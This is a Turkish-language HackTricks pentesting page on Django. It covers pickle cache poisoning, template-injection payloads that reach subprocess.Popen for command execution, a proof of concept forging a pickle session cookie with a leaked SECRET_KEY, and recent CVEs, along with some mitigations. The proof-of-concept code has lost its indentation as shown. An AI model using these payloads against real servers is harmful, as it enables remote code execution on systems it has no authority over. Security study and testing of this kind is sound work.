# Django

{{#include /src/banners/hacktricks-training.md}}

## Önbellek Manipülasyonu ile RCE
Django'nun varsayılan önbellek depolama yöntemi [Python pickles](https://docs.python.org/3/library/pickle.html) olup, [güvenilmeyen girdi unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf) olduğunda RCE'ye yol açabilir. **Eğer bir saldırgan önbelleğe yazma erişimi elde ederse, bu açığı alttaki sunucuda RCE'ye yükseltebilir**.

Django önbelleği dört yerden birinde saklanır: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [bellek](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [dosyalar](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16) veya bir [veritabanı](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Redis sunucusunda veya veritabanında saklanan önbellek, en olası saldırı vektörleridir (Redis enjeksiyonu ve SQL enjeksiyonu), ancak bir saldırgan dosya tabanlı önbelleği kullanarak keyfi bir yazmayı RCE'ye dönüştürebilir. Bakımcılar bunu bir sorun olarak işaretlemiştir. Önbellek dosyası klasörünün, SQL tablo adının ve Redis sunucu bilgilerinin uygulamaya göre değişeceğini belirtmek önemlidir.

Bu HackerOne raporu, SQLite veritabanında saklanan Django önbelleğini istismar etmenin harika, tekrarlanabilir bir örneğini sunmaktadır: https://hackerone.com/reports/1415436

---

## Sunucu Tarafı Şablon Enjeksiyonu (SSTI)
Django Şablon Dili (DTL) **Turing-tamamlayıcıdır**. Kullanıcıdan sağlanan veriler bir *şablon dizesi* olarak işlenirse (örneğin `Template(user_input).render()` çağrılarak veya `|safe`/`format_html()` otomatik kaçışları kaldırdığında), bir saldırgan tam SSTI → RCE elde edebilir.

### Tespit
1. *Herhangi* bir temizlenmemiş istek verisini içeren `Template()` / `Engine.from_string()` / `render_to_string()` için dinamik çağrılara bakın.
2. Zaman tabanlı veya aritmetik bir yük gönderin:
```django
{{7*7}}
```
Eğer işlenmiş çıktı `49` içeriyorsa, girdi şablon motoru tarafından derlenmiştir.

### RCE'ye Giden Yolda Primitif
Django, `__import__`'a doğrudan erişimi engeller, ancak Python nesne grafiğine erişim mümkündür:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen`'ün indeksini bulun (≈400–500 Python derlemesine bağlı olarak) ve rastgele komutları çalıştırın:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Daha güvenli bir evrensel alet, `cls.__name__ == 'Popen'` olana kadar yinelemektir.

Aynı alet, kullanıcı girişini yanlış işleyen **Debug Toolbar** veya **Django-CMS** şablon render özellikleri için de çalışır.

---

## Pickle-Backed Session Cookie RCE
Eğer `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` ayarı etkinleştirilmişse (veya pickle'ı deseralize eden özel bir serileştirici), Django *oturum çerezini şifre çözer ve pickle'dan çıkarır* **herhangi bir görünüm kodunu çağırmadan önce**. Bu nedenle, geçerli bir imzalama anahtarına (varsayılan olarak proje `SECRET_KEY`) sahip olmak, anında uzaktan kod yürütme için yeterlidir.

### Exploit Gereksinimleri
* Sunucu `PickleSerializer` kullanıyor.
* Saldırgan `settings.SECRET_KEY`'yi biliyor / tahmin edebiliyor (GitHub, `.env`, hata sayfaları vb. üzerinden sızıntılar). 

### Kanıt-Konsept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Gönderilen çerez, WSGI işçi izinleriyle çalıştırılır.

**Önlemler**: Varsayılan `JSONSerializer`'ı koruyun, `SECRET_KEY`'i döndürün ve `SESSION_COOKIE_HTTPONLY`'yi yapılandırın.

---

## Son (2023-2025) Yüksek Etkili Django CVE'leri Pentester'ların Kontrol Etmesi Gerekenler
* **CVE-2025-48432** – *Kaçırılmamış `request.path` üzerinden Log Enjeksiyonu* (4 Haziran 2025'te düzeltildi). Saldırganların yeni satırları/ANSI kodlarını log dosyalarına sokmasına ve aşağı akış log analizini zehirlemesine olanak tanır. Yamanın seviyesi ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Kritik SQL enjeksiyonu* `QuerySet.values()/values_list()` üzerinde `JSONField`'da (CVSS 9.8). JSON anahtarlarını, alıntıdan çıkmak ve rastgele SQL çalıştırmak için oluşturun. 4.2.15 / 5.0.8'de düzeltildi.

Her zaman `X-Frame-Options` hata sayfası veya `/static/admin/css/base.css` hash'i aracılığıyla tam çerçeve sürümünü parmak izi ile belirleyin ve yukarıdakileri uygun olduğunda test edin.

---

## Referanslar
* Django güvenlik sürümü – "Django 5.2.2, 5.1.10, 4.2.22 CVE-2025-48432'yi ele alıyor" – 4 Haziran 2025.
* OP-Innovate: "Django, SQL enjeksiyon açığını gidermek için güvenlik güncellemeleri yayınladı CVE-2024-42005" – 11 Ağustos 2024.

{{#include /src/banners/hacktricks-training.md}}
